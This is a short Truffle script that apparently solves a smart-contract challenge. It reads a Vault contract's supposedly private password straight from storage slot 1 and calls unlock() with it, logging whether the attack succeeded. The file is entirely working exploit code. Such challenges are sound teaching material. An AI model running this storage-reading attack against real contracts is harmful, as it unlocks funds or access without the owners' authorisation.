const Vault = artifacts.require("Vault");

module.exports = async function (callback) {
  try {
    // Get the deployed instance of the Vault contract
    const vaultAddress = "0xDf60E7Ee76413263865ecC00AbdF3d68B52a1aC8";
    const vaultInstance = await Vault.at(vaultAddress);

    // Read contract memory to catch the password
    const guessed_password = await web3.eth.getStorageAt(vaultAddress, 1);
    console.log("Password retrieved from storage:", guessed_password);

    // Send the guessed password to the contract
    const tx = await vaultInstance.unlock(guessed_password);
    console.log("Unlock transaction sent:", tx.tx);

    // Check if the vault is still locked
    const locked = await vaultInstance.locked();

    // Verify if the attack was successful
    if (!locked) {
      console.log(
        "Attack successful! You guessed the password of the contract."
      );
    } else {
      console.log("Attack failed. The vault is still locked.");
    }

    callback();
  } catch (error) {
    console.error(error);
    callback(error);
  }
};
